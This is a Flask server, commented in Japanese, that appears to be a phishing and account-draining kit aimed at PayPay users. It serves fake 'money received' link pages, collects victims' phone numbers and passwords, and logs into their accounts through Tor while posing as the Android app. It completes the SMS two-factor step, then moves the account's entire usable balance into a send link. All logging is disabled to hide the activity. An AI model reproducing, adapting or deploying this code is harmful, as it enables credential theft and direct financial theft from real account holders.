import os
import secrets
import random
import string
import re
import logging
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, send_from_directory, session, render_template
from tor_utils import TOR_SOCKS_PROXY

# ロギング完全無効化
logging.disable(logging.CRITICAL)
logging.getLogger("werkzeug").disabled = True

app = Flask(__name__, static_folder="docs", template_folder="templates")
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"

_paypay_sessions: dict = {}
_links: list = []  # in-memory only
LINK_ID_RE = re.compile(r"^[A-Za-z0-9]{16}$")


def cleanup():
    """期限切れ・不要なメモリデータを消す"""
    now = datetime.now()
    # リンク清掃
    global _links
    _links = [l for l in _links if datetime.fromisoformat(l["expires_at"]) > now]
    # 古いセッションも消す（念のため上限を設ける）
    if len(_paypay_sessions) > 50:
        # 古いものから削除（単純に先頭から）
        keys = list(_paypay_sessions.keys())[:len(_paypay_sessions) - 30]
        for k in keys:
            _paypay_sessions.pop(k, None)


def get_links():
    cleanup()
    now = datetime.now()
    return [l for l in _links if datetime.fromisoformat(l["expires_at"]) > now]


def gen_link_id():
    chars = string.ascii_letters + string.digits
    while True:
        link_id = "".join(random.choices(chars, k=16))
        if not any(l["id"] == link_id for l in _links):
            return link_id


def gen_payment_id():
    return "0239" + "".join([str(random.randint(0, 9)) for _ in range(16)])


def fmt_jp_datetime(dt_str):
    dt = datetime.fromisoformat(dt_str)
    return f"{dt.year}年{dt.month}月{dt.day}日 {dt.hour}時{str(dt.minute).zfill(2)}分"


def fmt_jp_date(dt_str):
    dt = datetime.fromisoformat(dt_str)
    return f"{dt.year}年{dt.month}月{dt.day}日"


def _get_paypay_instance(token: str):
    return _paypay_sessions.get(token)


def generic_error():
    return jsonify({"error": "エラーが発生しました"}), 500


@app.route("/")
def index():
    return send_from_directory("docs", "index.html")


@app.route("/admin")
def admin():
    return send_from_directory("docs", "admin.html")


@app.route("/admin/api/links", methods=["GET"])
def admin_list_links():
    return jsonify(get_links())


@app.route("/admin/api/links", methods=["POST"])
def admin_create_link():
    data = request.get_json(force=True)
    try:
        amount = int(data.get("amount", 0))
    except (TypeError, ValueError):
        return jsonify({"error": "金額が不正です"}), 400
    if amount <= 0:
        return jsonify({"error": "1円以上の金額を入力してください"}), 400

    now = datetime.now()
    expires = now + timedelta(days=4)
    link = {
        "id": gen_link_id(),
        "type": "created",
        "amount": amount,
        "created_at": now.isoformat(timespec="seconds"),
        "expires_at": expires.isoformat(timespec="seconds"),
        "payment_id": gen_payment_id(),
        "paypay_url": None,
    }
    _links.append(link)
    cleanup()
    return jsonify(link)


@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.get_json(force=True)
    phone = (data.get("phone") or "").strip()
    password = (data.get("password") or "").strip()

    if not phone or not password:
        return jsonify({"error": "phone と password は必須です"}), 400

    try:
        from paypaypay import PayPay
    except ImportError:
        return jsonify({"error": "paypaypay がインストールされていません"}), 500

    try:
        paypay = PayPay(phone, password, proxy=TOR_SOCKS_PROXY)
        paypay.login()
    except Exception:
        return jsonify({"error": "ログインに失敗しました"}), 401

    token = secrets.token_urlsafe(32)
    _paypay_sessions[token] = paypay
    session["paypay_token"] = token
    cleanup()

    return jsonify({"status": "sms_required"})


@app.route("/api/sms_confirm", methods=["POST"])
def api_sms_confirm():
    token = session.get("paypay_token")
    if not token:
        return jsonify({"error": "セッションが見つかりません。再度ログインしてください。"}), 401

    paypay = _get_paypay_instance(token)
    if paypay is None:
        return jsonify({"error": "セッションの有効期限が切れました。再度ログインしてください。"}), 401

    version = getattr(paypay, "version", "5.57.0")
    _headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "ja-JP,ja;q=0.9",
        "Cache-Control": "no-cache",
        "Client-Id": "pay2-mobile-app-client",
        "Client-OS-Type": "ANDROID",
        "Client-OS-Version": "29.0.0",
        "Client-Type": "PAYPAYAPP",
        "Client-Version": version,
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Host": "www.paypay.ne.jp",
        "Origin": "https://www.paypay.ne.jp",
        "Pragma": "no-cache",
        "Referer": "https://www.paypay.ne.jp/portal/oauth2/otl-request?client_id=pay2-mobile-app-client&mode=navigation-2fa",
        "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Android WebView";v="132")',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": f"Mozilla/5.0 (Linux; Android 10; SCV38 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36 jp.pay2.app.android/{version}",
        "X-Requested-With": "jp.ne.paypay.android.app",
    }

    try:
        complete_payload = {
            "params": {
                "extension_id": "user-main-2fa-v1",
                "data": {"type": "COMPLETE_OTL", "payload": None},
            }
        }
        r = paypay.session.post(
            "https://www.paypay.ne.jp/portal/api/v2/oauth2/extension/code-grant/update",
            headers=_headers,
            json=complete_payload,
        )
        get_uri = r.json()
    except Exception:
        return generic_error()

    if get_uri.get("header", {}).get("resultCode") != "S0000":
        return jsonify({"status": "waiting"})

    try:
        uri = get_uri["payload"]["redirect_uri"].replace("paypay://oauth2/callback?", "").split("&")
    except Exception:
        return jsonify({"status": "waiting"})

    app_headers = dict(paypay.session.headers)
    app_headers.pop("Device-Lock-Type", None)
    app_headers.pop("Device-Lock-App-Setting", None)

    try:
        token_r = paypay.session.post(
            "https://app4.paypay.ne.jp/bff/v2/oauth2/token",
            headers=app_headers,
            data={
                "clientId": "pay2-mobile-app-client",
                "redirectUri": "paypay://oauth2/callback",
                "code": uri[0].replace("code=", ""),
                "codeVerifier": paypay.code_verifier,
            },
            params={"payPayLang": "ja"},
        )
        get_token = token_r.json()
    except Exception:
        return generic_error()

    if get_token.get("header", {}).get("resultCode") != "S0000":
        return jsonify({"error": "認証に失敗しました"}), 401

    paypay.access_token = get_token["payload"]["accessToken"]
    paypay.session.headers["Authorization"] = f"Bearer {paypay.access_token}"

    result = {
        "access_token": paypay.access_token,
        "device_uuid": getattr(paypay, "device_uuid", None),
        "client_uuid": getattr(paypay, "client_uuid", None),
    }
    # 即座にセッション消す
    _paypay_sessions.pop(token, None)
    session.pop("paypay_token", None)
    cleanup()

    return jsonify({"status": "ok", **result})


@app.route("/api/create_link", methods=["POST"])
def api_create_link():
    data = request.get_json(force=True)
    access_token = (data.get("access_token") or "").strip()

    if not access_token:
        return jsonify({"error": "access_token は必須です"}), 400

    try:
        from paypaypay import PayPay
    except ImportError:
        return jsonify({"error": "paypaypay がインストールされていません"}), 500

    try:
        paypay = PayPay(access_token=access_token, proxy=TOR_SOCKS_PROXY)
        balance = paypay.get_balance()
        amount = int(balance.useable_balance or 0)
        if amount <= 0:
            return jsonify({"error": "送金可能な残高がありません"}), 400
        link_result = paypay.create_link(amount=amount)
        paypay_url = link_result.link

        now = datetime.now()
        expires = now + timedelta(days=4)
        entry = {
            "id": gen_link_id(),
            "type": "received",
            "amount": amount,
            "created_at": now.isoformat(timespec="seconds"),
            "expires_at": expires.isoformat(timespec="seconds"),
            "payment_id": gen_payment_id(),
            "paypay_url": paypay_url,
        }
        _links.append(entry)
        cleanup()

        # インスタンスを即座に棄てる
        del paypay

        return jsonify({"status": "ok", "link": paypay_url, "amount": amount})
    except Exception:
        return generic_error()


@app.route("/<path:filename>")
def static_or_link(filename):
    if LINK_ID_RE.match(filename):
        links = get_links()
        link = next((l for l in links if l["id"] == filename), None)
        if link:
            return render_template(
                "link.html",
                amount=link["amount"],
                send_datetime=fmt_jp_datetime(link["created_at"]),
                send_date=fmt_jp_date(link["created_at"]),
                expires_datetime=fmt_jp_datetime(link["expires_at"]),
                expires_date=fmt_jp_date(link["expires_at"]),
                payment_id=link["payment_id"],
            )
    return send_from_directory("docs", filename)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
